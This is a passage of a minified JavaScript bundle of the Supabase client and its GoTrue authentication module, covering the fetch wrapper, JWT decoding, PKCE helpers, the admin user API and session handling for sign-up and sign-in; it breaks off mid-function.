document<"u"?Xr="web":typeof navigator<"u"&&navigator.product==="ReactNative"?Xr="react-native":Xr="node";const pS={"X-Client-Info":`supabase-js-${Xr}/${hS}`};var fS=function(i,t,r,s){function a(c){return c instanceof r?c:new r(function(d){d(c)})}return new(r||(r=Promise))(function(c,d){function h(m){try{f(s.next(m))}catch(y){d(y)}}function p(m){try{f(s.throw(m))}catch(y){d(y)}}function f(m){m.done?c(m.value):a(m.value).then(h,p)}f((s=s.apply(i,t||[])).next())})};const gS=i=>{let t;return i?t=i:typeof fetch>"u"?t=Bd:t=fetch,(...r)=>t(...r)},mS=()=>typeof Headers>"u"?zy:Headers,yS=(i,t,r)=>{const s=gS(r),a=mS();return(c,d)=>fS(void 0,void 0,void 0,function*(){var h;const p=(h=yield t())!==null&&h!==void 0?h:i;let f=new a(d?.headers);return f.has("apikey")||f.set("apikey",i),f.has("Authorization")||f.set("Authorization",`Bearer ${p}`),s(c,Object.assign(Object.assign({},d),{headers:f}))})};function bS(i){return i.replace(/\/$/,"")}function vS(i,t){const{db:r,auth:s,realtime:a,global:c}=i,{db:d,auth:h,realtime:p,global:f}=t;return{db:Object.assign(Object.assign({},d),r),auth:Object.assign(Object.assign({},h),s),realtime:Object.assign(Object.assign({},p),a),global:Object.assign(Object.assign({},f),c)}}function wS(i){return Math.round(Date.now()/1e3)+i}function kS(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(i){const t=Math.random()*16|0;return(i=="x"?t:t&3|8).toString(16)})}const Wt=()=>typeof document<"u",ni={tested:!1,writable:!1},ss=()=>{if(!Wt())return!1;try{if(typeof globalThis.localStorage!="object")return!1}catch{return!1}if(ni.tested)return ni.writable;const i=`lswt-${Math.random()}${Math.random()}`;try{globalThis.localStorage.setItem(i,i),globalThis.localStorage.removeItem(i),ni.tested=!0,ni.writable=!0}catch{ni.tested=!0,ni.writable=!1}return ni.writable};function Ic(i){const t={},r=new URL(i);if(r.hash&&r.hash[0]==="#")try{new URLSearchParams(r.hash.substring(1)).forEach((a,c)=>{t[c]=a})}catch{}return r.searchParams.forEach((s,a)=>{t[a]=s}),t}const Gy=i=>{let t;return i?t=i:typeof fetch>"u"?t=(...r)=>ir(async()=>{const{default:s}=await Promise.resolve().then(()=>ms);return{default:s}},void 0).then(({default:s})=>s(...r)):t=fetch,(...r)=>t(...r)},xS=i=>typeof i=="object"&&i!==null&&"status"in i&&"ok"in i&&"json"in i&&typeof i.json=="function",ii=async(i,t,r)=>{await i.setItem(t,JSON.stringify(r))},Oo=async(i,t)=>{const r=await i.getItem(t);if(!r)return null;try{return JSON.parse(r)}catch{return r}},_c=async(i,t)=>{await i.removeItem(t)};function TS(i){const t="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";let r="",s,a,c,d,h,p,f,m=0;for(i=i.replace("-","+").replace("_","/");m<i.length;)d=t.indexOf(i.charAt(m++)),h=t.indexOf(i.charAt(m++)),p=t.indexOf(i.charAt(m++)),f=t.indexOf(i.charAt(m++)),s=d<<2|h>>4,a=(h&15)<<4|p>>2,c=(p&3)<<6|f,r=r+String.fromCharCode(s),p!=64&&a!=0&&(r=r+String.fromCharCode(a)),f!=64&&c!=0&&(r=r+String.fromCharCode(c));return r}class da{constructor(){this.promise=new da.promiseConstructor((t,r)=>{this.resolve=t,this.reject=r})}}da.promiseConstructor=Promise;function hg(i){const t=/^([a-z0-9_-]{4})*($|[a-z0-9_-]{3}=?$|[a-z0-9_-]{2}(==)?$)$/i,r=i.split(".");if(r.length!==3)throw new Error("JWT is not valid: not a JWT structure");if(!t.test(r[1]))throw new Error("JWT is not valid: payload is not in base64url format");const s=r[1];return JSON.parse(TS(s))}async function SS(i){return await new Promise(t=>{setTimeout(()=>t(null),i)})}function AS(i,t){return new Promise((s,a)=>{(async()=>{for(let c=0;c<1/0;c++)try{const d=await i(c);if(!t(c,null,d)){s(d);return}}catch(d){if(!t(c,d)){a(d);return}}})()})}function CS(i){return("0"+i.toString(16)).substr(-2)}function $i(){const t=new Uint32Array(56);if(typeof crypto>"u"){const r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~",s=r.length;let a="";for(let c=0;c<56;c++)a+=r.charAt(Math.floor(Math.random()*s));return a}return crypto.getRandomValues(t),Array.from(t,CS).join("")}async function ES(i){const r=new TextEncoder().encode(i),s=await crypto.subtle.digest("SHA-256",r),a=new Uint8Array(s);return Array.from(a).map(c=>String.fromCharCode(c)).join("")}function PS(i){return btoa(i).replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"")}async function Hi(i){if(!(typeof crypto<"u"&&typeof crypto.subtle<"u"&&typeof TextEncoder<"u"))return console.warn("WebCrypto API is not supported. Code challenge method will default to use plain instead of sha256."),i;const r=await ES(i);return PS(r)}class Vd extends Error{constructor(t,r){super(t),this.__isAuthError=!0,this.name="AuthError",this.status=r}}function ye(i){return typeof i=="object"&&i!==null&&"__isAuthError"in i}class IS extends Vd{constructor(t,r){super(t,r),this.name="AuthApiError",this.status=r}toJSON(){return{name:this.name,message:this.message,status:this.status}}}function _S(i){return ye(i)&&i.name==="AuthApiError"}class qy extends Vd{constructor(t,r){super(t),this.name="AuthUnknownError",this.originalError=r}}class yi extends Vd{constructor(t,r,s){super(t),this.name=r,this.status=s}toJSON(){return{name:this.name,message:this.message,status:this.status}}}class Gi extends yi{constructor(){super("Auth session missing!","AuthSessionMissingError",400)}}class Rc extends yi{constructor(){super("Auth session or user missing","AuthInvalidTokenResponseError",500)}}class Lo extends yi{constructor(t){super(t,"AuthInvalidCredentialsError",400)}}class Bo extends yi{constructor(t,r=null){super(t,"AuthImplicitGrantRedirectError",500),this.details=null,this.details=r}toJSON(){return{name:this.name,message:this.message,status:this.status,details:this.details}}}class pg extends yi{constructor(t,r=null){super(t,"AuthPKCEGrantCodeExchangeError",500),this.details=null,this.details=r}toJSON(){return{name:this.name,message:this.message,status:this.status,details:this.details}}}class nd extends yi{constructor(t,r){super(t,"AuthRetryableFetchError",r)}}function Dc(i){return ye(i)&&i.name==="AuthRetryableFetchError"}class RS extends yi{constructor(t,r,s){super(t,"AuthWeakPasswordError",r),this.reasons=s}}var DS=function(i,t){var r={};for(var s in i)Object.prototype.hasOwnProperty.call(i,s)&&t.indexOf(s)<0&&(r[s]=i[s]);if(i!=null&&typeof Object.getOwnPropertySymbols=="function")for(var a=0,s=Object.getOwnPropertySymbols(i);a<s.length;a++)t.indexOf(s[a])<0&&Object.prototype.propertyIsEnumerable.call(i,s[a])&&(r[s[a]]=i[s[a]]);return r};const Ji=i=>i.msg||i.message||i.error_description||i.error||JSON.stringify(i),MS=[502,503,504];async function fg(i){if(!xS(i))throw new nd(Ji(i),0);if(MS.includes(i.status))throw new nd(Ji(i),i.status);let t;try{t=await i.json()}catch(r){throw new qy(Ji(r),r)}throw typeof t=="object"&&t&&typeof t.weak_password=="object"&&t.weak_password&&Array.isArray(t.weak_password.reasons)&&t.weak_password.reasons.length&&t.weak_password.reasons.reduce((r,s)=>r&&typeof s=="string",!0)?new RS(Ji(t),i.status,t.weak_password.reasons):new IS(Ji(t),i.status||500)}const jS=(i,t,r,s)=>{const a={method:i,headers:t?.headers||{}};return i==="GET"?a:(a.headers=Object.assign({"Content-Type":"application/json;charset=UTF-8"},t?.headers),a.body=JSON.stringify(s),Object.assign(Object.assign({},a),r))};async function ve(i,t,r,s){var a;const c=Object.assign({},s?.headers);s?.jwt&&(c.Authorization=`Bearer ${s.jwt}`);const d=(a=s?.query)!==null&&a!==void 0?a:{};s?.redirectTo&&(d.redirect_to=s.redirectTo);const h=Object.keys(d).length?"?"+new URLSearchParams(d).toString():"",p=await OS(i,t,r+h,{headers:c,noResolveJson:s?.noResolveJson},{},s?.body);return s?.xform?s?.xform(p):{data:Object.assign({},p),error:null}}async function OS(i,t,r,s,a,c){const d=jS(t,s,a,c);let h;try{h=await i(r,d)}catch(p){throw console.error(p),new nd(Ji(p),0)}if(h.ok||await fg(h),s?.noResolveJson)return h;try{return await h.json()}catch(p){await fg(p)}}function ai(i){var t;let r=null;FS(i)&&(r=Object.assign({},i),i.expires_at||(r.expires_at=wS(i.expires_in)));const s=(t=i.user)!==null&&t!==void 0?t:i;return{data:{session:r,user:s},error:null}}function gg(i){const t=ai(i);return!t.error&&i.weak_password&&typeof i.weak_password=="object"&&Array.isArray(i.weak_password.reasons)&&i.weak_password.reasons.length&&i.weak_password.message&&typeof i.weak_password.message=="string"&&i.weak_password.reasons.reduce((r,s)=>r&&typeof s=="string",!0)&&(t.data.weak_password=i.weak_password),t}function Ln(i){var t;return{data:{user:(t=i.user)!==null&&t!==void 0?t:i},error:null}}function LS(i){return{data:i,error:null}}function BS(i){const{action_link:t,email_otp:r,hashed_token:s,redirect_to:a,verification_type:c}=i,d=DS(i,["action_link","email_otp","hashed_token","redirect_to","verification_type"]),h={action_link:t,email_otp:r,hashed_token:s,redirect_to:a,verification_type:c},p=Object.assign({},d);return{data:{properties:h,user:p},error:null}}function NS(i){return i}function FS(i){return i.access_token&&i.refresh_token&&i.expires_in}var zS=function(i,t){var r={};for(var s in i)Object.prototype.hasOwnProperty.call(i,s)&&t.indexOf(s)<0&&(r[s]=i[s]);if(i!=null&&typeof Object.getOwnPropertySymbols=="function")for(var a=0,s=Object.getOwnPropertySymbols(i);a<s.length;a++)t.indexOf(s[a])<0&&Object.prototype.propertyIsEnumerable.call(i,s[a])&&(r[s[a]]=i[s[a]]);return r};class VS{constructor({url:t="",headers:r={},fetch:s}){this.url=t,this.headers=r,this.fetch=Gy(s),this.mfa={listFactors:this._listFactors.bind(this),deleteFactor:this._deleteFactor.bind(this)}}async signOut(t,r="global"){try{return await ve(this.fetch,"POST",`${this.url}/logout?scope=${r}`,{headers:this.headers,jwt:t,noResolveJson:!0}),{data:null,error:null}}catch(s){if(ye(s))return{data:null,error:s};throw s}}async inviteUserByEmail(t,r={}){try{return await ve(this.fetch,"POST",`${this.url}/invite`,{body:{email:t,data:r.data},headers:this.headers,redirectTo:r.redirectTo,xform:Ln})}catch(s){if(ye(s))return{data:{user:null},error:s};throw s}}async generateLink(t){try{const{options:r}=t,s=zS(t,["options"]),a=Object.assign(Object.assign({},s),r);return"newEmail"in s&&(a.new_email=s?.newEmail,delete a.newEmail),await ve(this.fetch,"POST",`${this.url}/admin/generate_link`,{body:a,headers:this.headers,xform:BS,redirectTo:r?.redirectTo})}catch(r){if(ye(r))return{data:{properties:null,user:null},error:r};throw r}}async createUser(t){try{return await ve(this.fetch,"POST",`${this.url}/admin/users`,{body:t,headers:this.headers,xform:Ln})}catch(r){if(ye(r))return{data:{user:null},error:r};throw r}}async listUsers(t){var r,s,a,c,d,h,p;try{const f={nextPage:null,lastPage:0,total:0},m=await ve(this.fetch,"GET",`${this.url}/admin/users`,{headers:this.headers,noResolveJson:!0,query:{page:(s=(r=t?.page)===null||r===void 0?void 0:r.toString())!==null&&s!==void 0?s:"",per_page:(c=(a=t?.perPage)===null||a===void 0?void 0:a.toString())!==null&&c!==void 0?c:""},xform:NS});if(m.error)throw m.error;const y=await m.json(),v=(d=m.headers.get("x-total-count"))!==null&&d!==void 0?d:0,w=(p=(h=m.headers.get("link"))===null||h===void 0?void 0:h.split(","))!==null&&p!==void 0?p:[];return w.length>0&&(w.forEach(P=>{const T=parseInt(P.split(";")[0].split("=")[1].substring(0,1)),C=JSON.parse(P.split(";")[1].split("=")[1]);f[`${C}Page`]=T}),f.total=parseInt(v)),{data:Object.assign(Object.assign({},y),f),error:null}}catch(f){if(ye(f))return{data:{users:[]},error:f};throw f}}async getUserById(t){try{return await ve(this.fetch,"GET",`${this.url}/admin/users/${t}`,{headers:this.headers,xform:Ln})}catch(r){if(ye(r))return{data:{user:null},error:r};throw r}}async updateUserById(t,r){try{return await ve(this.fetch,"PUT",`${this.url}/admin/users/${t}`,{body:r,headers:this.headers,xform:Ln})}catch(s){if(ye(s))return{data:{user:null},error:s};throw s}}async deleteUser(t,r=!1){try{return await ve(this.fetch,"DELETE",`${this.url}/admin/users/${t}`,{headers:this.headers,body:{should_soft_delete:r},xform:Ln})}catch(s){if(ye(s))return{data:{user:null},error:s};throw s}}async _listFactors(t){try{const{data:r,error:s}=await ve(this.fetch,"GET",`${this.url}/admin/users/${t.userId}/factors`,{headers:this.headers,xform:a=>({data:{factors:a},error:null})});return{data:r,error:s}}catch(r){if(ye(r))return{data:null,error:r};throw r}}async _deleteFactor(t){try{return{data:await ve(this.fetch,"DELETE",`${this.url}/admin/users/${t.userId}/factors/${t.id}`,{headers:this.headers}),error:null}}catch(r){if(ye(r))return{data:null,error:r};throw r}}}const Ky="2.62.0",US="http://localhost:9999",WS="supabase.auth.token",$S={"X-Client-Info":`gotrue-js/${Ky}`},mg=10,HS={getItem:i=>ss()?globalThis.localStorage.getItem(i):null,setItem:(i,t)=>{ss()&&globalThis.localStorage.setItem(i,t)},removeItem:i=>{ss()&&globalThis.localStorage.removeItem(i)}};function yg(i={}){return{getItem:t=>i[t]||null,setItem:(t,r)=>{i[t]=r},removeItem:t=>{delete i[t]}}}function GS(){if(typeof globalThis!="object")try{Object.defineProperty(Object.prototype,"__magic__",{get:function(){return this},configurable:!0}),__magic__.globalThis=__magic__,delete Object.prototype.__magic__}catch{typeof self<"u"&&(self.globalThis=self)}}const qi={debug:!!(globalThis&&ss()&&globalThis.localStorage&&globalThis.localStorage.getItem("supabase.gotrue-js.locks.debug")==="true")};class Jy extends Error{constructor(t){super(t),this.isAcquireTimeout=!0}}class qS extends Jy{}async function KS(i,t,r){qi.debug&&console.log("@supabase/gotrue-js: navigatorLock: acquire lock",i,t);const s=new globalThis.AbortController;return t>0&&setTimeout(()=>{s.abort(),qi.debug&&console.log("@supabase/gotrue-js: navigatorLock acquire timed out",i)},t),await globalThis.navigator.locks.request(i,t===0?{mode:"exclusive",ifAvailable:!0}:{mode:"exclusive",signal:s.signal},async a=>{if(a){qi.debug&&console.log("@supabase/gotrue-js: navigatorLock: acquired",i,a.name);try{return await r()}finally{qi.debug&&console.log("@supabase/gotrue-js: navigatorLock: released",i,a.name)}}else{if(t===0)throw qi.debug&&console.log("@supabase/gotrue-js: navigatorLock: not immediately available",i),new qS(`Acquiring an exclusive Navigator LockManager lock "${i}" immediately failed`);if(qi.debug)try{const c=await globalThis.navigator.locks.query();console.log("@supabase/gotrue-js: Navigator LockManager state",JSON.stringify(c,null,"  "))}catch(c){console.warn("@supabase/gotrue-js: Error when querying Navigator LockManager state",c)}return console.warn("@supabase/gotrue-js: Navigator LockManager returned a null lock when using #request without ifAvailable set to true, it appears this browser is not following the LockManager spec https://developer.mozilla.org/en-US/docs/Web/API/LockManager/request"),await r()}})}GS();const JS={url:US,storageKey:WS,autoRefreshToken:!0,persistSession:!0,detectSessionInUrl:!0,headers:$S,flowType:"implicit",debug:!1},Qr=30*1e3,bg=3;async function vg(i,t,r){return await r()}class ds{constructor(t){var r,s;this.memoryStorage=null,this.stateChangeEmitters=new Map,this.autoRefreshTicker=null,this.visibilityChangedCallback=null,this.refreshingDeferred=null,this.initializePromise=null,this.detectSessionInUrl=!0,this.lockAcquired=!1,this.pendingInLock=[],this.broadcastChannel=null,this.logger=console.log,this.instanceID=ds.nextInstanceID,ds.nextInstanceID+=1,this.instanceID>0&&Wt()&&console.warn("Multiple GoTrueClient instances detected in the same browser context. It is not an error, but this should be avoided as it may produce undefined behavior when used concurrently under the same storage key.");const a=Object.assign(Object.assign({},JS),t);if(this.logDebugMessages=!!a.debug,typeof a.debug=="function"&&(this.logger=a.debug),this.persistSession=a.persistSession,this.storageKey=a.storageKey,this.autoRefreshToken=a.autoRefreshToken,this.admin=new VS({url:a.url,headers:a.headers,fetch:a.fetch}),this.url=a.url,this.headers=a.headers,this.fetch=Gy(a.fetch),this.lock=a.lock||vg,this.detectSessionInUrl=a.detectSessionInUrl,this.flowType=a.flowType,a.lock?this.lock=a.lock:Wt()&&(!((r=globalThis?.navigator)===null||r===void 0)&&r.locks)?this.lock=KS:this.lock=vg,this.mfa={verify:this._verify.bind(this),enroll:this._enroll.bind(this),unenroll:this._unenroll.bind(this),challenge:this._challenge.bind(this),listFactors:this._listFactors.bind(this),challengeAndVerify:this._challengeAndVerify.bind(this),getAuthenticatorAssuranceLevel:this._getAuthenticatorAssuranceLevel.bind(this)},this.persistSession?a.storage?this.storage=a.storage:ss()?this.storage=HS:(this.memoryStorage={},this.storage=yg(this.memoryStorage)):(this.memoryStorage={},this.storage=yg(this.memoryStorage)),Wt()&&globalThis.BroadcastChannel&&this.persistSession&&this.storageKey){try{this.broadcastChannel=new globalThis.BroadcastChannel(this.storageKey)}catch(c){console.error("Failed to create a new BroadcastChannel, multi-tab state changes will not be available",c)}(s=this.broadcastChannel)===null||s===void 0||s.addEventListener("message",async c=>{this._debug("received broadcast notification from other tab or client",c),await this._notifyAllSubscribers(c.data.event,c.data.session,!1)})}this.initialize()}_debug(...t){return this.logDebugMessages&&this.logger(`GoTrueClient@${this.instanceID} (${Ky}) ${new Date().toISOString()}`,...t),this}async initialize(){return this.initializePromise?await this.initializePromise:(this.initializePromise=(async()=>await this._acquireLock(-1,async()=>await this._initialize()))(),await this.initializePromise)}async _initialize(){try{const t=Wt()?await this._isPKCEFlow():!1;if(this._debug("#_initialize()","begin","is PKCE flow",t),t||this.detectSessionInUrl&&this._isImplicitGrantFlow()){const{data:r,error:s}=await this._getSessionFromURL(t);if(s)return this._debug("#_initialize()","error detecting session from URL",s),s?.message==="Identity is already linked"||s?.message==="Identity is already linked to another user"?{error:s}:(await this._removeSession(),{error:s});const{session:a,redirectType:c}=r;return this._debug("#_initialize()","detected session in URL",a,"redirect type",c),await this._saveSession(a),setTimeout(async()=>{c==="recovery"?await this._notifyAllSubscribers("PASSWORD_RECOVERY",a):await this._notifyAllSubscribers("SIGNED_IN",a)},0),{error:null}}return await this._recoverAndRefresh(),{error:null}}catch(t){return ye(t)?{error:t}:{error:new qy("Unexpected error during initialization",t)}}finally{await this._handleVisibilityChange(),this._debug("#_initialize()","end")}}async signUp(t){var r,s,a;try{await this._removeSession();let c;if("email"in t){const{email:m,password:y,options:v}=t;let w=null,P=null;if(this.flowType==="pkce"){const T=$i();await ii(this.storage,`${this.storageKey}-code-verifier`,T),w=await Hi(T),P=T===w?"plain":"s256"}c=await ve(this.fetch,"POST",`${this.url}/signup`,{headers:this.headers,redirectTo:v?.emailRedirectTo,body:{email:m,password:y,data:(r=v?.data)!==null&&r!==void 0?r:{},gotrue_meta_security:{captcha_token:v?.captchaToken},code_challenge:w,code_challenge_method:P},xform:ai})}else if("phone"in t){const{phone:m,password:y,options:v}=t;c=await ve(this.fetch,"POST",`${this.url}/signup`,{headers:this.headers,body:{phone:m,password:y,data:(s=v?.data)!==null&&s!==void 0?s:{},channel:(a=v?.channel)!==null&&a!==void 0?a:"sms",gotrue_meta_security:{captcha_token:v?.captchaToken}},xform:ai})}else throw new Lo("You must provide either an email or phone number and a password");const{data:d,error:h}=c;if(h||!d)return{data:{user:null,session:null},error:h};const p=d.session,f=d.user;return d.session&&(await this._saveSession(d.session),await this._notifyAllSubscribers("SIGNED_IN",p)),{data:{user:f,session:p},error:null}}catch(c){if(ye(c))return{data:{user:null,session:null},error:c};throw c}}async signInWithPassword(t){try{await this._removeSession();let r;if("email"in t){const{email:c,password:d,options:h}=t;r=await ve(this.fetch,"POST",`${this.url}/token?grant_type=password`,{headers:this.headers,body:{email:c,password:d,gotrue_meta_security:{captcha_token:h?.captchaToken}},xform:gg})}else if("phone"in t){const{phone:c,password:d,options:h}=t;r=await ve(this.fetch,"POST",`${this.url}/token?grant_type=password`,{headers:this.headers,body:{phone:c,password:d,gotrue_meta_security:{captcha_token:h?.captchaToken}},xform:gg})}else throw new Lo("You must provide either an email or phone number and a password");const{data:s,error:a}=r;return a?{data:{user:null,session:null},error:a}:!s||!s.session||!s.user?{data:{user:null,session:null},error:new Rc}:(s.session&&(await this._saveSession(s.session),await this._notifyAllSubscribers("SIGNED_IN",s.session)),{data:Object.assign({user:s.user,session:s.session},s.weak_password?{weakPassword:s.weak_password}:null),error:a})}catch(r){if(ye(r))return{data:{user:null,session:null},error:r};throw r}}async signInWithOAuth(t){var r,s,a,c;return await this._removeSession(),await this._handleProviderSignIn(t.provider,{redirectTo:(r=t.options)===null||r===void 0?void 0:r.redirectTo,scopes:(s=t.options)===null||s===void 0?void 0:s.scopes,queryParams:(a=t.options)===null||a===void 0?void 0:a.queryParams,skipBrowserRedirect:(c=t.options)===null||c===void 0?void 0:c.skipBrowserRedirect})}async exchangeCodeForSession(t){return await this.initializePromise,this._acquireLock(-1,async()=>this._exchangeCodeForSession(t))}async _exchangeCodeForSession(t){const r=await Oo(this.storage,`${this.storageKey}-code-verifier`),[s,a]=(r??"").split("/"),{data:c,error:d}=await ve(this.fetch,"POST",`${this.url}/token?grant_type=pkce`,{headers:this.headers,body:{auth_code:t,code_verifier:s},xform:ai});return await _c(this.storage,`${this.storageKey}-code-verifier`),d?{data:{user:null,session:null,redirectType:null},error:d}:!c||!c.session||!c.user?{data:{user:null,session:null,redirectType:null},error:new Rc}:(c.session&&(await this._saveSession(c.session),await this._notifyAllSubscribers("SIGNED_IN",c.session)),{data:Object.assign(Object.assign({},c),{redirectType:a??null}),error:d})}async signInWithIdToken(t){await this._removeSession();try{const{options:r,provider:s,token:a,access_token:c,nonce:d}=t,h=await ve(this.fetch,"POST",`${this.url}/token?grant_type=id_token`,{headers:this.headers,body:{provider:s,id_token:a,access_token:c,nonce:d,gotrue_meta_security:{captcha_token:r?.captchaToken}},xform:ai}),{data:p,error:f}=h;return f?{data:{user:null,session:null},error:f}:!p||!p.session||!p.user?{data:{user:null,session:null},error:new Rc}:(p.session&&(await this._saveSession(p.session),await this._notifyAllSubscribers("SIGNED_IN",p.session)),{data:p,error:f})}catch(r){if(ye(r))return{data:{user:null,session:null},error:r};throw r}}async signInWithOtp(t){var r,s,a,c,d;try{if(await this._removeSession(),"email"in t){const{email:h,options:p}=t;let f=null,m=null;if(this.flowType==="pkce"){const v=$i();await ii(this.storage,`${this.storageKey}-code-verifier`,v),f=await Hi(v),m=v===f?"plain":"s256"}const{error:y}=await ve(this.fetch,"POST",`${this.url}/otp`,{headers:this.headers,body:{email:h,data:(r=p?.data)!==null&&r!==void 0?r:{},create_user:(s=p?.shouldCreateUser)!==null&&s!==void 0?s:!0,gotrue_meta_security:{captcha_token:p?.captchaToken},code_challenge:f,code_challenge_method:m},redirectTo:p?.emailRedirectTo});return{data:{user:null,session:null},error:y}}if("phone"in t){const{phone:h,options:p}=t,{data:f,error:m}=await ve(this.fetch,"POST",`${this.url}/otp`,{headers:this.headers,body:{phone:h,data:(a=p?.data)!==null&&a!==void 0?a:{},create_user:(c=p?.shouldCreateUser)!==null&&c!==void 0?c:!0,gotrue_meta_security:{captcha_token:p?.captchaToken},channel:(d=p?.channel)!==null&&d!==void 0?d:"sms"}});return{data:{user:null,session:null,messageId:f?.message_id},error:m}}throw new Lo("You must provide either an email or phone number.")}catch(h){if(ye(h))return{data:{user:null,session:null},error:h};throw h}}async verifyOtp(t){var r,s;try{t.type!=="email_change"&&t.type!=="phone_change"&&await this._removeSession();let a,c;"options"in t&&(a=(r=t.options)===null||r===void 0?void 0:r.redirectTo,c=(s=t.options)===null||s===void 0?void 0:s.captchaToken);const{data:d,error:h}=await ve(this.fetch,"POST",`${this.url}/verify`,{headers:this.headers,body:Object.assign(Object.assign({},t),{gotrue_meta_security:{captcha_token:c}}),redirectTo:a,xform:ai});if(h)throw h;if(!d)throw new Error("An error occurred on token verification.");const p=d.session,f=d.user;return p?.access_token&&(await this._saveSession(p),await this._notifyAllSubscribers("SIGNED_IN",p)),{data:{user:f,session:p},error:null}}catch(a){if(ye(a))return{data:{user:null,session:null},error:a};throw a}}async signInWithSSO(t){var r,s,a;try{await this._removeSession();let c=null,d=null;if(this.flowType==="pkce"){const h=$i();await ii(this.storage,`${this.storageKey}-code-verifier`,h),c=await Hi(h),d=h===c?"plain":"s256"}return await ve(this.fetch,"POST",`${this.url}/sso`,{body:Object.assign(Object.assign(Object.assign(Object.assign(Object.assign({},"providerId"in t?{provider_id:t.providerId}:null),"domain"in t?{domain:t.domain}:null),{redirect_to:(s=(r=t.options)===null||r===void 0?void 0:r.redirectTo)!==null&&s!==void 0?s:void 0}),!((a=t?.options)===null||a===void 0)&&a.captchaToken?{gotrue_meta_security:{captcha_token:t.options.captchaToken}}:null),{skip_http_redirect:!0,code_challenge:c,code_challenge_method:d}),headers:this.headers,xform:LS})}catch(c){if(ye(c))return{data:null,error:c};throw c}}async reauthenticate(){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._reauthenticate())}async _reauthenticate(){try{return await this._useSession(async t=>{const{data:{session:r},error:s}=t;if(s)throw s;if(!r)throw new Gi;const{error:a}=await ve(this.fetch,"GET",`${this.url}/reauthenticate`,{headers:this.headers,jwt:r.access_token});return{data:{user:null,session:null},error:a}})}catch(t){if(ye(t))return{data:{user:null,session:null},error:t};throw t}}async resend(t){try{t.type!="email_change"&&t.type!="phone_change"&&await this._removeSession();const r=`${this.url}/resend`;if("email"in t){const{email:s,type:a,options:c}=t,{error:d}=await ve(this.fetch,"POST",r,{headers:this.headers,body:{email:s,type:a,gotrue_meta_security:{captcha_token:c?.captchaToken}},redirectTo:c?.emailRedirectTo});return{data:{user:null,session:null},error:d}}else if("phone"in t){const{phone:s,type:a,options:c}=t,{data:d,error:h}=await ve(this.fetch,"POST",r,{headers:this.headers,body:{phone:s,type:a,gotrue_meta_security:{captcha_token:c?.captchaToken}}});return{data:{user:null,session:null,messageId:d?.message_id},error:h}}throw new Lo("You must provide either an email or phone number and a type")}catch(r){if(ye(r))return{data:{user:null,session:null},error:r};throw r}}async getSession(){return await this.initializePromise,this._acquireLock(-1,async()=>this._useSession(async t=>t))}async _acquireLock(t,r){this._debug("#_acquireLock","begin",t);try{if(this.lockAcquired){const s=this.pendingInLock.length?this.pendingInLock[this.pendingInLock.length-1]:Promise.resolve(),a=(async()=>(await s,await r()))();return this.pendingInLock.push((async()=>{try{await a}catch{}})()),a}return await this.lock(`lock:${this.storageKey}`,t,async()=>{this._debug("#_acquireLock","lock acquired for storage key",this.storageKey);try{this.lockAcquired=!0;const s=r();for(this.pendingInLock.push((async()=>{try{await s}catch{}})()),await s;this.pendingInLock.length;){const a=[...this.pendingInLock];await Promise.all(a),this.pendingInLock.splice(0,a.length)}return await s}finally{this._debug("#_acquireLock","lock released for storage key",this.storageKey),this.lockAcquired=!1}})}finally{this._debug("#_acquireLock","end")}}async _useSession(t){this._debug("#_useSession","begin");try{const r=await this.__loadSession();return await t(r)}finally{this._debug("#_useSession","end")}}async __loadSession(){this._debug("#__loadSession()","begin"),this.lockAcquired||this._debug("#__loadSession()","used outside of an acquired lock!",new Error().stack);try{let t=null;const r=await Oo(this.storage,this.storageKey);if(this._debug("#getSession()","session from storage",r),r!==null&&(this._isValidSession(r)?t=r:(this._debug("#getSession()","session from storage is not valid"),await this._removeSession())),!t)return{data:{session:null},error:null};const s=t.expires_at?t.expires_at<=Date.now()/1e3:!1;if(this._debug("#__loadSession()",`session has${s?"":" not"} expired`,"expires_at",t.expires_at),!s)return{data:{session:t},error:null};const{session:a,error:c}=await this._callRefreshToken(t.refresh_token);return c?{data:{session:null},error:c}:{data:{session:a},error:null}}finally{this._debug("#__loadSession()","end")}}async getUser(t){return t?await this._getUser(t):(await this.initializePromise,this._acquireLock(-1,async()=>await this._getUser()))}async _getUser(t){try{return t?await ve(this.fetch,"GET",`${this.url}/user`,{headers:this.headers,jwt:t,xform:Ln}):await this._useSession(async r=>{var s,a;const{data:c,error:d}=r;if(d)throw d;return await ve(this.fetch,"GET",`${this.url}/user`,{headers:this.headers,jwt:(a=(s=c.session)===null||s===void 0?void 0:s.access_token)!==null&&a!==void 0?a:void 0,xform:Ln})})}catch(r){if(ye(r))return{data:{user:null},error:r};throw r}}async updateUser(t,r={}){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._updateUser(t,r))}async _updateUser(t,r={}){try{return await this._useSession(async s=>{const{data:a,error:c}=s;if(c)throw c;if(!a.session)throw new Gi;const d=a.session;let h=null,p=null;if(this.flowType==="pkce"&&t.email!=null){const y=$i();await ii(this.storage,`${this.storageKey}-code-verifier`,y),h=await Hi(y),p=y===h?"plain":"s256"}const{data:f,error:m}=await ve(this.fetch,"PUT",`${this.url}/user`,{headers:this.headers,redirectTo:r?.emailRedirectTo,body:Object.assign(Object.assign({},t),{code_challenge:h,code_challenge_method:p}),jwt:d.access_token,xform:Ln});if(m)throw m;return d.user=f.user,await this._saveSession(d),await this._notifyAllSubscribers("USER_UPDATED",d),{data:{user:d.user},error:null}})}catch(s){if(ye(s))return{data:{user:null},error:s};throw s}}_decodeJWT(t){return hg(t)}async setSession(t){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._setSession(t))}async _setSession(t){try{if(!t.access_token||!t.refresh_token)throw new Gi;const r=Date.now()/1e3;let s=r,a=!0,c=null;const d=hg(t.access_token);if(d.exp&&(s=d.exp,a=s<=r),a){const{session:h,error:p}=await this._callRefreshToken(t.refresh_token);if(p)return{data:{user:null,session:null},error:p};if(!h)return{data:{user:null,session:null},error:null};c=h}else{const{data:h,error:p}=await this._getUser(t.access_token);if(p)throw p;c={access_token:t.access_token,refresh_token:t.refresh_token,user:h.user,token_type:"bearer",expires_in:s-r,expires_at:s},await this._saveSession(c),await this._notifyAllSubscribers("SIGNED_IN",c)}return{data:{user:c.user,session:c},error:null}}catch(r){if(ye(r))return{data:{session:null,user:null},error:r};throw r}}async refreshSession(t){return await 